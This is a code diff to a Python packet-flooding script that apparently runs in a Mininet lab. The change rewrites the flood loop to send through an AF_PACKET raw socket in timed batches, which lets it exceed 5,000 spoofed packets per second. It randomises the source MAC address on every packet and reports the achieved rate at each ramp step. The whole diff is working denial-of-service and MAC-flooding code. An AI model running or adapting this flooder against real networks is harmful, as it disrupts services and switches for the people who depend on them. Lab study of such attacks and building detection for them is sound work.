@@ -120,26 +120,69 @@ def _build_packet(dst_ip: str):
     return pkt
 
 
-def run_flood(target_ip: str, iface: str, rate: float,
-              stop_event, counters: dict) -> None:
-    """Send spoofed packets at `rate` pkt/s until stop_event is set.
+def _build_template_packet(dst_ip: str) -> bytearray:
+    """Build a single raw template packet to bypass Scapy overhead."""
+    log.info("Pre-building packet template...")
+    return bytearray(bytes(_build_packet(dst_ip)))
 
-    Thread-safe packet counters are written to `counters`:
-      counters['sent']   — total packets handed to sendp()
-      counters['errors'] — total sendp() exceptions
+
+def run_flood(target_ip: str, iface: str, rate_state: dict,
+              stop_event, counters: dict) -> None:
+    """Send spoofed packets at a dynamic rate until stop_event is set.
+
+    Uses an AF_PACKET raw socket and batched sending to bypass Python's
+    per-packet overhead and time.sleep() resolution limits, allowing us
+    to actually hit 5,000+ pkt/s.
     """
-    from scapy.all import sendp  # type: ignore[import]
-    interval = 1.0 / rate
+    import socket
+    import os
+    
+    # 1. Pre-build template
+    template = _build_template_packet(target_ip)
+    
+    # 2. Open raw socket
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+        s.bind((iface, 0))
+    except Exception as exc:
+        log.error("Failed to open raw socket on %s: %s", iface, exc)
+        counters['errors'] += 1
+        return
+
+    # 3. Batched send loop
+    batch_interval = 0.05  # Wake up 20 times per second
+    next_wakeup = time.time()
+
     while not stop_event.is_set():
-        pkt = _build_packet(target_ip)
+        now = time.time()
+        # Prevent huge bursts if we fell behind (e.g. CPU stalled)
+        if now > next_wakeup + 0.5:
+            next_wakeup = now
+
+        rate = rate_state.get('rate', 500)
+        # Calculate how many packets to send in this 50ms batch
+        pkts_to_send = max(1, int(rate * batch_interval))
+
         try:
-            sendp(pkt, iface=iface, verbose=False)
-            counters['sent'] += 1
+            for _ in range(pkts_to_send):
+                # Mutate the source MAC (bytes 6-11) inline for infinite entropy
+                rand_mac = bytearray(os.urandom(6))
+                rand_mac[0] &= 0xfe  # Ensure unicast (clear multicast bit)
+                template[6:12] = rand_mac
+                
+                s.send(template)
+                counters['sent'] += 1
         except Exception as exc:
             counters['errors'] += 1
-            log.error("sendp error: %s", exc)
-            break
-        time.sleep(interval)
+            log.error("socket.send error: %s", exc)
+            time.sleep(0.5)
+            next_wakeup = time.time()
+            continue
+
+        next_wakeup += batch_interval
+        sleep_time = next_wakeup - time.time()
+        if sleep_time > 0:
+            time.sleep(sleep_time)
 
 
 # ── Main ──────────────────────────────────────────────────────────────────────
@@ -203,6 +246,12 @@ def main() -> int:
     # ── Early import check — fail fast and visibly if scapy is missing ───────
     # Without this, the ImportError happens silently inside a daemon thread,
     # main() exits rc=0, and zero packets were ever sent.
+    import sys
+    # Add user's site-packages to path so root (Mininet) can find scapy installed via pip
+    user_site_packages = "/home/a-anuj/.local/lib/python3.14/site-packages"
+    if user_site_packages not in sys.path:
+        sys.path.append(user_site_packages)
+        
     try:
         from scapy.all import Ether, IP, UDP, Raw, sendp  # noqa: F401
         log.info("scapy import OK")
@@ -231,35 +280,48 @@ def main() -> int:
     log.info("=" * 60)
 
     flood_thread = None
+    rate_state = {'rate': float(args.start_rate)}
+    # Use a single cumulative counter dict since we now use a single thread
+    cumulative_counters: dict = {'sent': 0, 'errors': 0}
+    
     try:
+        # Start the single flood thread
+        flood_thread = threading.Thread(
+            target=run_flood,
+            args=(target, iface, rate_state, stop_event, cumulative_counters),
+            daemon=True,
+            name="flood-worker",
+        )
+        flood_thread.start()
+        log.info("  single flood thread started (target=%s, iface=%s)", target, iface)
+
         for rate in safe_rate_ramp(
             start_rate=float(args.start_rate),
             max_rate=float(args.max_rate),
             step=float(args.step),
             interval=args.ramp_interval,
         ):
-            log.info("RAMP STEP — setting rate to %.0f pkt/s  (target=%s)",
-                     rate, target)
-
-            # Snapshot previous thread's counters before stopping it
-            if flood_thread and flood_thread.is_alive():
-                stop_event.set()
-                flood_thread.join(timeout=3)
-                stop_event.clear()
-
-            counters: dict = {'sent': 0, 'errors': 0, 'rate': rate}
-            step_counters.append(counters)
-
-            flood_thread = threading.Thread(
-                target=run_flood,
-                args=(target, iface, rate, stop_event, counters),
-                daemon=True,
-                name=f"flood-{int(rate)}",
-            )
-            flood_thread.start()
-            log.info("  flood thread started (rate=%.0f, iface=%s)", rate, iface)
-            # Hold this rate for ramp_interval seconds before safe_rate_ramp
-            # yields the next step (the sleep is inside safe_rate_ramp itself)
+            active_threads = threading.active_count()
+            log.info("RAMP STEP — setting rate to %.0f pkt/s  (active threads: %d)",
+                     rate, active_threads)
+            
+            rate_state['rate'] = rate
+            
+            # Record a snapshot of counters for this step
+            step_counters.append({
+                'rate': rate,
+                'sent': cumulative_counters['sent'],
+                'errors': cumulative_counters['errors']
+            })
+            
+            # Print an explicit achieved vs configured comparison to catch bottlenecks
+            if len(step_counters) >= 2:
+                prev = step_counters[-2]
+                curr = step_counters[-1]
+                pkts_this_step = curr['sent'] - prev['sent']
+                actual_rate = pkts_this_step / args.ramp_interval
+                log.info("  -> Step %.0f pkt/s achieved: %.1f pkt/s (%d pkts sent in %.1fs)", 
+                         prev['rate'], actual_rate, pkts_this_step, args.ramp_interval)
 
         # Hold at max rate until duration expires or watchdog fires
         remaining = duration - args.ramp_interval * (
@@ -279,9 +341,9 @@ def main() -> int:
             flood_thread.join(timeout=5)
         watchdog.cancel()
 
-        # Tally totals across all rate steps
-        total_sent   = sum(c['sent']   for c in step_counters)
-        total_errors = sum(c['errors'] for c in step_counters)
+        # Tally totals
+        total_sent   = cumulative_counters['sent']
+        total_errors = cumulative_counters['errors']
 
         attack_stop = datetime.now(timezone.utc).isoformat()
         log.info("=" * 60)
@@ -293,11 +355,20 @@ def main() -> int:
         log.info("  Steps run       : %d", len(step_counters))
         log.info("  Total sent      : %d packets", total_sent)
         log.info("  Total errors    : %d", total_errors)
+        log.info("  Active threads  : %d", threading.active_count())
         if total_sent == 0 and step_counters:
             log.error("  *** WARNING: ZERO packets sent — check scapy/interface. ***")
+        
+        # Display marginal sent packets per step
+        prev_sent = 0
+        prev_err = 0
         for sc in step_counters:
-            log.info("    rate=%-6.0f  sent=%-8d  errors=%d",
-                     sc['rate'], sc['sent'], sc['errors'])
+            marginal_sent = sc['sent'] - prev_sent
+            marginal_err = sc['errors'] - prev_err
+            log.info("    rate=%-6.0f  sent=%-8d  errors=%d (cumulative: %d)",
+                     sc['rate'], marginal_sent, marginal_err, sc['sent'])
+            prev_sent = sc['sent']
+            prev_err = sc['errors']
         log.info("  Log file        : %s", LOG_FILE)
         log.info("=" * 60)
 
